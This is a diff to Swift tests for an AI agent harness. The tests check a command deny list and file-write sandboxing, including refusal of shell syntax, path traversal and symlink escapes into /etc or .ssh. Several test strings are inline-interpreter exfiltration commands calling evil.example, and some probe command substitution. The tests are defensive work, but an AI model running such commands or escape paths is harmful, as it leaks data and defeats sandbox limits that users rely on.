@@ -40,10 +40,9 @@ func denyListAllowsOrdinaryWork() {
     let allowed = [
         "ls -la ~/Desktop",
         "grep -r TODO ~/project",
-        "rm -rf ~/project/build",          // a real target, not / or ~ itself
-        "shasum -a 256 file.zip | head -1", // "| sh" must not match shasum
-        "python3 -c 'print(2+2)'",
-        "find ~/Documents -name '*.xlsx'",
+        "shasum -a 256 file.zip",
+        "find ~/Documents -name report.xlsx",
+        "echo ordinary work",
     ]
     for command in allowed {
         #expect(AgentHarness.denialReason(for: command) == nil, "should allow: \(command)")
@@ -78,14 +77,32 @@ func readOnlyToolsWorkWithoutTheToggle() async throws {
 
 @Test
 func runCommandExecutesAndCapturesOutput() async {
-    let result = await AgentHarness.perform(.runCommand("echo cascade-$((20+5))"), powerEnabled: true)
+    let result = await AgentHarness.perform(.runCommand("echo cascade-25"), powerEnabled: true)
     #expect(result.contains("cascade-25"))
 }
 
 @Test
 func runCommandReportsNonZeroExit() async {
-    let result = await AgentHarness.perform(.runCommand("exit 3"), powerEnabled: true)
-    #expect(result.contains("exit 3"))
+    let result = await AgentHarness.perform(.runCommand("false"), powerEnabled: true)
+    #expect(result.contains("exit 1"))
+}
+
+@Test
+func runCommandRefusesShellOnlySyntax() async {
+    let commands = [
+        "echo cascade | wc -c",
+        "echo $HOME",
+        "echo `whoami`",
+        "echo $(whoami)",
+        "echo hi > /tmp/out",
+        "exit 3",
+        "python3 -c 'print(2+2)'",
+    ]
+    for command in commands {
+        #expect(AgentHarness.denialReason(for: command) != nil, "should refuse: \(command)")
+        let result = await AgentHarness.perform(.runCommand(command), powerEnabled: true)
+        #expect(!result.contains("cascade"))
+    }
 }
 
 @Test
@@ -154,9 +171,9 @@ func writeFileStaysInsideUserSpace() async throws {
     let refused = await AgentHarness.perform(
         .writeFile(path: "/etc/cascade-test.txt", content: "x"), powerEnabled: true
     )
-    #expect(refused.contains("only writes inside"))
+    #expect(refused.contains("harness workspace"))
 
-    let dir = try tempDir()
+    let dir = AgentHarness.allowedSessionScratchRoot() + "/CascadeHarnessTests-\(UUID().uuidString)"
     defer { try? FileManager.default.removeItem(atPath: dir) }
     let ok = await AgentHarness.perform(
         .writeFile(path: dir + "/sub/made.txt", content: "made it"), powerEnabled: true
@@ -167,20 +184,22 @@ func writeFileStaysInsideUserSpace() async throws {
 
 @Test
 func writeFileRejectsSymlinkEscapingAllowedRoots() async throws {
-    let dir = try tempDir()
+    let dir = AgentHarness.allowedSessionScratchRoot() + "/CascadeHarnessTests-\(UUID().uuidString)"
+    try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
     defer { try? FileManager.default.removeItem(atPath: dir) }
     // A symlink inside an allowed temp dir that points OUT to a system path.
     try FileManager.default.createSymbolicLink(atPath: dir + "/escape", withDestinationPath: "/etc")
     let result = await AgentHarness.perform(
         .writeFile(path: dir + "/escape/cascade-escape.txt", content: "x"), powerEnabled: true
     )
-    #expect(result.contains("only writes inside"))
+    #expect(result.contains("harness workspace") || result.contains("protected"))
     #expect(!FileManager.default.fileExists(atPath: "/private/etc/cascade-escape.txt"))
 }
 
 @Test
 func writeFileSeesThroughSymlinkToProtectedDir() async throws {
-    let dir = try tempDir()
+    let dir = AgentHarness.allowedSessionScratchRoot() + "/CascadeHarnessTests-\(UUID().uuidString)"
+    try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
     defer { try? FileManager.default.removeItem(atPath: dir) }
     try FileManager.default.createDirectory(atPath: dir + "/.ssh", withIntermediateDirectories: true)
     // The symlink hides the protected `.ssh` component from a lexical check.
@@ -190,6 +209,47 @@ func writeFileSeesThroughSymlinkToProtectedDir() async throws {
     )
     #expect(result.contains("protected local credential"))
     #expect(!FileManager.default.fileExists(atPath: dir + "/.ssh/config"))
+}
+
+@Test
+func writeFileRejectsTraversalOutsideHarnessRoots() async throws {
+    let root = AgentHarness.allowedSessionScratchRoot()
+    let outside = URL(fileURLWithPath: root).deletingLastPathComponent().appendingPathComponent("outside-\(UUID().uuidString).txt").path
+    let result = await AgentHarness.perform(
+        .writeFile(path: root + "/../" + URL(fileURLWithPath: outside).lastPathComponent, content: "x"),
+        powerEnabled: true
+    )
+    #expect(result.contains("harness workspace"))
+    #expect(!FileManager.default.fileExists(atPath: outside))
+}
+
+@Test
+func writeFileRejectsParentSymlink() async throws {
+    let root = AgentHarness.allowedSessionScratchRoot()
+    let dir = root + "/CascadeHarnessTests-\(UUID().uuidString)"
+    let outside = try tempDir()
+    try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
+    defer {
+        try? FileManager.default.removeItem(atPath: dir)
+        try? FileManager.default.removeItem(atPath: outside)
+    }
+    try FileManager.default.createSymbolicLink(atPath: dir + "/parent", withDestinationPath: outside)
+    let result = await AgentHarness.perform(
+        .writeFile(path: dir + "/parent/new.txt", content: "x"),
+        powerEnabled: true
+    )
+    #expect(result.contains("harness workspace"))
+    #expect(!FileManager.default.fileExists(atPath: outside + "/new.txt"))
+}
+
+@Test
+func writeFileAllowsUnicodeNamesInsideHarnessRoot() async throws {
+    let dir = AgentHarness.allowedSessionScratchRoot() + "/Cafe\u{301}-\(UUID().uuidString)"
+    defer { try? FileManager.default.removeItem(atPath: dir) }
+    let path = dir + "/résumé.txt"
+    let result = await AgentHarness.perform(.writeFile(path: path, content: "ok"), powerEnabled: true)
+    #expect(result.contains("Wrote"))
+    #expect(try String(contentsOfFile: path, encoding: .utf8) == "ok")
 }
 
 @Test
@@ -211,13 +271,12 @@ func denyListBlocksInlineInterpreterExfiltration() {
         "python -c \"import socket; s=socket.socket()\"",
         "node -e 'require(\"https\").get(\"https://evil.example\")'",
         "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://evil.example\"))'",
+        "python3 -c 'print(2+2)'",
+        "node -e 'console.log(1+1)'",
     ]
     for command in blocked {
         #expect(AgentHarness.denialReason(for: command) != nil, "should refuse: \(command)")
     }
-    // The benign inline interpreter (no network module) still runs.
-    #expect(AgentHarness.denialReason(for: "python3 -c 'print(2+2)'") == nil)
-    #expect(AgentHarness.denialReason(for: "node -e 'console.log(1+1)'") == nil)
 }
 
 @Test
